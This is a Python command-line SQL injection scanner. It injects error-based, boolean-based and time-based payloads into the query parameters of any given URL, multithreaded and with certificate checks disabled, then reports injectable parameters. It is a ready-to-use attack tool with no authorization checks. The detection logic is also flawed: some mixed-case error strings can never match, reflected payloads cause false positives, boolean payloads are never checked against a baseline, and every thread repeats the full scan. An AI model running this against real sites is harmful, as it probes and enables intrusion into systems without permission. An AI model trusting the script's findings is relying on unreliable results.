import requests
import re
import threading
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, init
from optparse import OptionParser

# Initialize colorama for colored output
init(autoreset=True)

# SQL Injection payloads: error-based, boolean-based, time-based, etc.
SQLI_PAYLOADS = {
    "error_based": ["' OR 1=1--", "' AND 1=2--", "' UNION SELECT 1,2,3--"],
    "boolean_based": ["' OR '1'='1", "' AND '1'='2", "' OR 'a'='a"],
    "time_based": ["' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--"]
}

# Known SQL error messages (from various databases)
SQL_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "quoted string not properly terminated", "sql syntax", "syntax error",
    "ORA-01756", "UNION SELECT", "pg_query", "SQLite"
]

# Function to print a banner
def print_banner():
    print(Fore.GREEN + '''
    ██████   █████   ██▓     ██▓
  ▒██    ▒ ▒██▓  ██▒▓██▒    ▓██▒
  ░ ▓██▄   ▒██▒  ██░▒██░    ▒██▒
    ▒   ██▒░██  █▀ ░▒██░    ░██░
  ▒██████▒▒░▒███▒█▄ ░██████▒░██░
  ▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░░▓  
  ░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░ ▒ ░
  ░  ░  ░     ░   ░   ░ ░    ▒ ░
        ░      ░        ░  ░ ░  
      Advanced SQL Injection Scanner - Python tool
    ''')

# Function to send a GET request
def send_request(url, headers=None):
    try:
        response = requests.get(url, headers=headers, timeout=10, verify=False)
        return response
    except requests.RequestException as e:
        print(Fore.RED + f"Error with request: {e}")
        return None

# Function to check if a response indicates a SQL error
def check_for_sqli(response):
    if response:
        for error in SQL_ERRORS:
            if error in response.text.lower():
                return True
    return False

# Function to inject payload into a specific parameter
def replace_param(url, param, payload):
    parsed_url = urlparse(url)
    query = parse_qs(parsed_url.query)
    query[param] = payload
    new_query = urlencode(query, doseq=True)
    new_url = parsed_url._replace(query=new_query)
    return urlunparse(new_url)

# Function to test each payload
def test_payload(url, param, payload, headers=None):
    modified_url = replace_param(url, param, payload)
    response = send_request(modified_url, headers)
    if response and check_for_sqli(response):
        print(Fore.RED + f"[+] SQL Injection found on parameter '{param}' with payload '{payload}'")
        print(Fore.RED + f"URL: {modified_url}")
        return modified_url
    return None

# Function to test for time-based blind SQL injection
def test_time_based_payload(url, param, payload, delay, headers=None):
    modified_url = replace_param(url, param, payload)
    start_time = time.time()
    response = send_request(modified_url, headers)
    end_time = time.time()
    if response and (end_time - start_time) >= delay:
        print(Fore.RED + f"[+] Time-based Blind SQL Injection found on parameter '{param}' with payload '{payload}'")
        print(Fore.RED + f"URL: {modified_url}")
        return modified_url
    return None

# Function to get parameters from a URL
def get_parameters(url):
    parsed_url = urlparse(url)
    query = parsed_url.query
    params = re.findall(r"([^&=?]+)=([^&=?]+)", query)
    return [param[0] for param in params]

# Function to scan URL for SQL Injection vulnerabilities
def scan_url(url, headers=None, delay=5, verbose=False):
    params = get_parameters(url)
    results = []

    for param in params:
        # Error-based and Boolean-based Payload Testing
        for category, payloads in SQLI_PAYLOADS.items():
            for payload in payloads:
                if verbose:
                    print(Fore.GREEN + f"Testing parameter '{param}' with {category} payload '{payload}'")
                result = test_payload(url, param, payload, headers)
                if result:
                    results.append(result)

        # Time-based Blind Payload Testing
        for payload in SQLI_PAYLOADS["time_based"]:
            if verbose:
                print(Fore.GREEN + f"Testing parameter '{param}' with time-based payload '{payload}'")
            result = test_time_based_payload(url, param, payload, delay, headers)
            if result:
                results.append(result)

    return results

# Multithreading to scan with multiple threads
def scan_url_multithreaded(url, headers=None, delay=5, threads=5, verbose=False):
    print(Fore.GREEN + f"[+] Starting scan with {threads} threads")
    results = []

    # Thread worker function
    def worker():
        nonlocal results
        result = scan_url(url, headers, delay, verbose)
        if result:
            results.extend(result)

    # Start threads
    threads_list = []
    for _ in range(threads):
        thread = threading.Thread(target=worker)
        thread.start()
        threads_list.append(thread)

    # Wait for all threads to complete
    for thread in threads_list:
        thread.join()

    return results

# Save results to file
def save_results(results, filename):
    if results:
        with open(filename, 'w') as f:
            for result in results:
                f.write(result + '\n')
        print(Fore.GREEN + f"[+] Results saved to {filename}")
    else:
        print(Fore.RED + "[-] No vulnerabilities found to save.")

# Main function to parse command-line arguments and execute the scanner
def main():
    print_banner()

    # Parse command line options
    parser = OptionParser()
    parser.add_option('--url', dest="url", help="Target URL", metavar="URL")
    parser.add_option('--headers', dest="headers", help="Custom headers for requests")
    parser.add_option('--verbose', dest="verbose", action="store_true", help="Enable verbose output")
    parser.add_option('--threads', dest="threads", default=5, type="int", help="Number of concurrent threads")
    parser.add_option('--delay', dest="delay", default=5, type="int", help="Delay in seconds for time-based SQLi")
    parser.add_option('--output', dest="output", help="File to save the results")

    options, args = parser.parse_args()

    if not options.url:
        print(Fore.RED + "[-] Please provide a URL with --url.")
        return

    # Prepare headers (if provided)
    headers = None
    if options.headers:
        headers = {h.split(":")[0].strip(): h.split(":")[1].strip() for h in options.headers.split(",")}

    # Start the scan
    results = scan_url_multithreaded(options.url, headers=headers, delay=options.delay, threads=options.threads, verbose=options.verbose)

    if results:
        print(Fore.RED + f"[+] Found {len(results)} potential vulnerabilities!")
    else:
        print(Fore.GREEN + "[-] No vulnerabilities found.")
    
    # Save results if an output file is specified
    if options.output:
        save_results(results, options.output)

if __name__ == "__main__":
    main()
